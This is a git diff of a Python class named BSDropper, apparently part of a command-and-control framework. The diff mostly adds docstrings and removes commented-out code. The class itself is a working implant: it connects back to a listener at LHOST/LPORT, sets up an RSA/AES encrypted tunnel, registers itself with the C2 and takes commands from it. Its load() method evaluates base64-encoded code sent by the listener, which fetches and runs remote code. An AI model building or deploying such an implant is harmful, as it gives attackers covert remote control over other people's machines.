@@ -21,6 +21,8 @@ from common import importer
 from common import bcolors as bc
 
 class BSDropper():
+    """Dropper class, configured to create dropper files"""
+
     def __init__(self, LHOST, LPORT):
         self.LHOST = LHOST
         self.LPORT = LPORT
@@ -43,6 +45,8 @@ class BSDropper():
         self.recv_buf = b''
 
     def run(self):
+        """The main function called when a dropper runs"""
+
         #Retry connections a few times
         for i in range(self.retries):
             try:
@@ -87,30 +91,17 @@ class BSDropper():
 
 
     def connect(self):
+        """Make the initial connection back  to the listener"""
+
         self.s.connect((self.LHOST, self.LPORT))
+
 
     def recv(self, print_flag=True, debug=False, string=False):
         """Receive data from the C2, handles long messages until length <2048
-                decrypts and returns everything as bytes or string as per string flag.
-                now designed to get any network traffic and store in fifo, then do recv
-                from fifo."""
+        decrypts and returns everything as bytes or string as per string flag.
+        now designed to get any network traffic and store in fifo, then do recv
+        from fifo."""
 
-        '''
-        msg = b''
-        while True:
-            chunk = self.s.recv(2048)
-            msg += chunk
-            if len(chunk) < 2048:
-                break
-        #Decryption return either message, or False
-        print("DEBUG - IV : {}".format(msg[:AES.block_size]))
-        if string:
-            return self.decrypt(
-                    msg[:AES.block_size], msg[AES.block_size:]).decode()
-        else:
-            return self.decrypt(
-                msg[:AES.block_size], msg[AES.block_size:])
-                '''
         #get traffic from network and append to recv_buffer
         while True:
             chunk = self.s.recv(2048)
@@ -145,25 +136,12 @@ class BSDropper():
             return self.decrypt(IV, ciphertext).decode()
         else:
             return self.decrypt(IV, ciphertext)
-            '''
-    def send(self, message, debug=False):
-        if debug:
-            print("DEBUG - Sending : {}".format(message))
-        enc = self.encrypt(message)
-        if enc:
-            if debug:
-                print("Message - {} IV : {}".format(message, enc[0]))
-                bc.info("Message length : {}".format(len(b''.join(enc))))
-            message = b':' + b':'.join([b64encode(i) for i in enc]) + b':'' #colon IV colon message, colon
-            if message:
-                self.s.sendall(message)  #Sendall instead
-        else:
-            bc.err("Encryption failed in repl function.")
-        '''
+
 
     def send(self, message, debug=False):
         """Send string to C2, automatically encrypts the data and manages
-                conversion of the data to bytes objects before sending."""
+        conversion of the data to bytes & b64encoded objects before sending."""
+
         if not message:
             bc.info("No mesasge to send. not sending.")
             return
@@ -188,7 +166,10 @@ class BSDropper():
         except Exception as e:
             bc.err("Failed to send message: {}".format(e))
 
+
     def encrypt(self, message):
+        """Encrypt strings or bytes objects, always returning bytes"""
+
         if isinstance(message, str) and message != '':
             message = message.encode()
         if isinstance(message, bytes) and message != b'':
@@ -204,6 +185,8 @@ class BSDropper():
 
 
     def decrypt(self, IV, message):
+        """Decrypts strings or bytes objects, returning bytes objects"""
+
         print("DEBUG - Decrypting")
         if isinstance(message, str) and message != '':
             message = message.encode()
@@ -229,43 +212,10 @@ class BSDropper():
             bc.err("Failed to get command from C2.")
             self.cmd = self.args = ''
 
-            '''
-    def old_repl(self):
-        #print("DEBUG - Sending : {}".format(self.resp))
-        enc = self.encrypt(self.resp)
-        if enc:
-            print("DEBUG - {} IV : {}".format(self.resp, enc[0]))
-            print("DEBUG - message length : {}".format(len(b''.join(enc))))
-            self.resp = b''.join(enc)
-            if self.resp:
-                self.s.sendall(self.resp)  #Sendall instead
-                self.resp = ''
-        else:
-            bc.err("Encryption failed in repl function.")
-
-    def old_recv(self):
-        recv_command = b''
-        while True:
-            chunk = self.s.recv(2048)
-            recv_command += chunk
-            if len(chunk) < 2048:
-                break
-        #Encryption and listifying
-        print("DEBUG - IV : {}".format(recv_command[:AES.block_size]))
-        recv_command = self.decrypt(
-                recv_command[:AES.block_size], recv_command[AES.block_size:])
-        #recv_command = self.decrypt(
-        #        recv_command[:recv_command.find(b':')], recv_command[recv_command.find(b':'):])
-        if recv_command:
-            recv_command = recv_command.decode().split(' ')
-            self.cmd = recv_command[0]
-            self.args = ' '.join(recv_command[1:])
-        else:
-            bc.err("Decryption failed in receive function")
-            self.cmd = self.args = ''
-            '''
 
     def CRYPTSETUP(self, args=None):
+        """Configure and start the encrypted tunnel with the listener"""
+
         try:
             self.RSA_KEY = RSA.generate(2048)
             pub_key = self.RSA_KEY.publickey().exportKey()
@@ -294,10 +244,14 @@ class BSDropper():
 
 
     def REGISTER(self, args=None):
+        """Register the agent with the listener"""
+
         self.name = args
         self.send('Registered Impant as {}'.format(self.name))
 
     def load(self, args=None):
+        """Load python from a dictionary sent from the listener"""
+
         try:
             import_dict = eval(b64decode(args))
             bc.blue_print("[-] ", "Import dic evaluated fine : {}\n:{}".format(type(import_dict), import_dict))
@@ -313,12 +267,16 @@ class BSDropper():
             self.send('Load Failed for : {}'.format(args))
 
     def ping(self, args=None):
+        """Custom echo response for the BShell"""
+
         if not args:
             self.send("PONG")
         else:
             self.send('PONG ' + args)
 
     def terminate(self, args=None):
+        """Stop the agent fully"""
+
         bc.info("Terminating!")
         self.s.close()
         self.run_flag = False
